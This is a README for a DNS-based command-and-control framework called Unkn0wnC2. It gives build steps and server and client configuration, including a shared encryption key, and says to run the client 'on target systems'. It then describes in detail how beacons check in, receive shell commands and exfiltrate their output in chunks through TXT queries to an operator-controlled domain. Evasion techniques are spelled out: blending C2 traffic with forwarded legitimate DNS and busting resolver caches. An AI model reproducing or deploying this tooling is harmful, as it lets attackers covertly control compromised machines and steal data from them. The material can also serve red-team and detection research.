# Unkn0wnC2

A DNS-based Command & Control framework that operates as a legitimate authoritative DNS server with advanced evasion and reliability features.

### Architecture

This C2 framework is designed to blend seamlessly with legitimate DNS traffic by acting as an authoritative DNS server for your domain. The server provides:

- **Authoritative DNS Server** - Fully functional DNS server for your configured domain (e.g., `secwolf.net`)
- **C2 Communications** - Encodes commands/responses within legitimate-looking DNS queries
- **DNS Forwarding** - Proxies legitimate DNS queries to upstream servers (8.8.8.8) for stealth
- **Cache-Busting Protocol** - Timestamp injection prevents DNS resolver caching of C2 traffic
- **Chunked Result Handling** - Reliable exfiltration of large command outputs through multi-packet protocols
- **Interactive Console** - Real-time beacon management and task distribution interface

### To-Do

- [x] AES-GCM Encryption
- [x] Base36 Encoding (replaces HEX)
- [ ] Gzip compression
- [ ] Beacon/Task Cleanup
- [ ] Ensure graceful exits
- [ ] Handle other DNS request types for C2 and make CNAME primary
- [ ] Improve Console
- [ ] Improve Modularity
- [ ] Refactor Server
- [ ] Refactor Client
- [ ] Create Stager Client to retrieve full client from Server
- [ ] QuantumCat client for exfil
- [ ] Upload functionality through TXT answers

### Setup

#### 1. Domain Configuration
Set up your domain with glue records pointing to your server:
- Configure NS records: `ns1.yourdomain.net` and `ns2.yourdomain.net` pointing to your server IP
- Ensure your registrar has proper glue records configured

#### 2. Build the binaries
```bash
# Server
cd Server
go build -o dns-server .

# Client  
cd ../Client
go build -o dns-client .
```

#### 3. Configure the server
Edit `Server/config.json`:
```json
{
  "bind_addr": "0.0.0.0",
  "bind_port": 53,
  "domain": "secwolf.net",
  "ns1": "ns1.secwolf.net", 
  "ns2": "ns2.secwolf.net",
  "forward_dns": true,
  "upstream_dns": "8.8.8.8:53",
  "encryption_key": "MySecretC2Key123!@#DefaultChange",
  "debug": false
}
```
- `forward_dns`: Enable DNS forwarding for legitimate queries (recommended for stealth)
- `upstream_dns`: DNS server to forward legitimate queries to
- `debug`: Enable detailed logging for troubleshooting

#### 4. Configure the client
Edit `Client/config.json`:
```json
{
  "server_domain": "secwolf.net",
  "dns_server": "",
  "query_type": "TXT",
  "encoding": "aes-gcm-base36",
  "encryption_key": "MySecretC2Key123!@#DefaultChange",
  "timeout": 10,
  "max_command_length": 800,
  "retry_attempts": 3,
  "sleep_min": 5,
  "sleep_max": 15
}
```
- `dns_server`: Leave empty to use system DNS (recommended) or specify custom DNS server
- `encoding`: Use "aes-gcm-base36" for encrypted reliable encoding
- `encryption_key`: AES encryption key for C2 traffic (must match on both client/server)
- `max_command_length`: Increased to 800 to handle chunked result metadata
- `sleep_min/max`: Beacon interval randomization for operational security

#### 5. Deploy and run
```bash
# On your server (requires root for port 53)
sudo ./dns-server

# On target systems
./dns-client
```

#### 6. C2 Operations
The server includes an interactive console for managing beacons and issuing commands. Use `help` for available commands.

### Protocol Details

#### C2 Communication Flow
1. **Client Beacon**: Makes periodic DNS TXT queries with hex-encoded beacon data
2. **Cache-Busting**: Each query includes timestamp to prevent DNS resolver caching
3. **Task Distribution**: Server responds with encoded tasks or ACK messages
4. **Result Exfiltration**: Large outputs use two-phase chunking protocol:
   - Phase 1: `RESULT_META` with size and chunk count
   - Phase 2: `DATA` chunks sent sequentially with automatic reassembly

#### DNS Query Structure
```
<hex-encoded-payload>.<timestamp-cache-buster>.<domain>
```
- Payload is split into 62-character chunks (DNS label limit compliance)
- Timestamp prevents DNS resolver caching between communications
- Appears as normal subdomain lookups to network monitoring

#### Encoding Protocol
- **AES-GCM Encryption**: Encryption with authentication for C2 traffic
- **Base36 Encoding**: DNS-safe encoding that handles encrypted binary data reliably
- **Message format**: `TYPE|BeaconID|Data...` pipe-delimited structure (encrypted before encoding)
- **Chunk handling**: Automatic splitting/reassembly for data over DNS limits

### DNS Communication Mechanics

#### DNS Resolution Chain
```
Client → Local DNS Resolver → Root DNS Servers → TLD Servers → Your Authoritative NS
```

1. **Client Query**: Beacon makes TXT record request for `<encoded-data>.<timestamp>.secwolf.net`
2. **Local Resolver**: Client's DNS resolver (ISP/corporate) checks cache, doesn't find entry
3. **Root Servers**: Resolver queries root servers for `.net` authority
4. **TLD Servers**: Root servers refer to `.net` TLD servers
5. **Your Server**: TLD servers refer to your authoritative nameservers (`ns1.secwolf.net`)
6. **C2 Processing**: Your server receives query, decodes C2 traffic, processes beacon/task
7. **Response Chain**: Your server responds back through the same chain to client

#### Checkin Process Flow

**Step 1 - Initial Beacon Registration**
```
DNS Query: TXT 1k3m9n8p2q7r4s6t...<timestamp>.secwolf.net
Decrypted: HELLO|beacon-id|hostname|username|os-info
Response:  TXT record with encrypted+base36-encoded "ACK" (first registration)
```

**Step 2 - Regular Beacon Checkins**
```
DNS Query: TXT 2a5b8c1d4e7f0g3h...<timestamp>.secwolf.net  
Decrypted: CHECKIN|beacon-id|hostname|username|os-info
Response:  TXT record with encrypted+base36-encoded:
           - "ACK" (no tasks pending)
           - "TASK|task-id|command" (task available)
```

#### Task Distribution Process

**Server-Side Task Queue**
1. Operator uses console: `task beacon-123 whoami`
2. Server creates task with unique ID and queues for beacon-123
3. Task status: `queued` → waiting for beacon checkin

**Task Delivery via DNS**
1. Beacon-123 makes regular checkin query
2. Server detects pending task in queue
3. Server responds with TXT record containing: `TASK|task-456|whoami`
4. Task status updated to: `sent` with timestamp
5. Beacon receives DNS response, extracts and executes command

#### Result Exfiltration Process

**Small Results (< 50 bytes raw)**
```
DNS Query: TXT 9m2n5p8q1r4s7t0u...<timestamp>.secwolf.net
Decrypted: RESULT|beacon-id|task-id|output-data  
Response:  TXT encrypted "ACK"
```

**Large Results (> 50 bytes raw) - Two-Phase Protocol**

**Phase 1 - Metadata**
```
DNS Query: TXT 3a6b9c2d5e8f1g4h...<timestamp>.secwolf.net
Decrypted: RESULT_META|beacon-id|task-id|total-size|chunk-count
Response:  TXT encrypted "ACK" 
```

**Phase 2 - Data Chunks**
```
DNS Query 1: TXT 7j0k3l6m9n2p5q8r...<timestamp>.secwolf.net
Decrypted 1: DATA|beacon-id|task-id|1|chunk-1-data

DNS Query 2: TXT 1s4t7u0v3w6x9y2z...<timestamp>.secwolf.net  
Decrypted 2: DATA|beacon-id|task-id|2|chunk-2-data

[... continues for all chunks ...]

Response:    TXT encrypted "ACK" for each chunk
```

**Server-Side Reassembly**
1. Server receives RESULT_META, prepares to collect chunks
2. Server receives DATA chunks, stores in order by chunk index
3. When all chunks received, server reconstructs complete result
4. Task status updated to `completed` with full output

#### Cache-Busting Mechanism

**Problem**: DNS resolvers cache responses, preventing real-time C2 communication

**Enhanced Solution**: Timestamp-based subdomain variation
```
Original:  <encrypted-base36-data>.secwolf.net
Enhanced:  <encrypted-base36-data>.<unix-timestamp>.secwolf.net
```

**Example DNS Queries**:
```
1. 2a5b8c1d4e7f0g3h6i9j2k5l8m1n4p7q.1729123456.secwolf.net  
2. 9x2y5z8a1b4c7d0e3f6g9h2i5j8k1l4m.1729123461.secwolf.net
3. 7n0p3q6r9s2t5u8v1w4x7y0z3a6b9c2d.1729123466.secwolf.net
```

Each query appears as different subdomain to DNS infrastructure, preventing caching while maintaining C2 communications.

#### Legitimate Traffic Handling

**DNS Forwarding for Stealth**
1. Non-C2 query received: `www.secwolf.net` or `mail.secwolf.net`
2. Server identifies as legitimate DNS (not hex-encoded C2 traffic)
3. Server forwards query to upstream DNS (8.8.8.8)
4. Server returns legitimate response or generates realistic IP

**Traffic Blending Result**
- Domain appears to host legitimate services (web, mail, etc.)  
- C2 traffic disguised as subdomain lookups for hosted applications
- Network monitoring sees normal DNS patterns with mixed legitimate/C2 queries

### Operational Features

#### Stealth Capabilities
- **DNS Forwarding**: Proxies legitimate queries to maintain domain functionality
- **Legitimate Responses**: Returns realistic IP addresses for non-C2 queries
- **Traffic Blending**: C2 communications appear as normal subdomain lookups
- **Cache Evasion**: Timestamp injection prevents DNS caching artifacts

### Interactive Console Commands

```
help                    - Show available commands
beacons                 - List all active beacons
beacon <id>            - Show detailed beacon information  
task <beacon_id> <cmd> - Queue command for specific beacon
tasks                  - Show all tasks and their status
clear                  - Clear the console screen
exit/quit              - Shutdown the server
```

### How it Works

1. **DNS Resolution Path**: Client → DNS Resolver → Root Servers → Your Authoritative NS
2. **Traffic Analysis**: Server distinguishes C2 traffic from legitimate DNS queries
3. **C2 Processing**: Decodes beacons, manages tasks, handles chunked result reassembly
4. **Legitimate Forwarding**: Non-C2 queries forwarded to upstream DNS for realistic responses
5. **Stealth Operation**: Maintains appearance of normal domain with mixed legitimate/C2 traffic

This architecture enables C2 operations through standard DNS infrastructure while maintaining operational security through legitimate traffic blending and cache evasion techniques.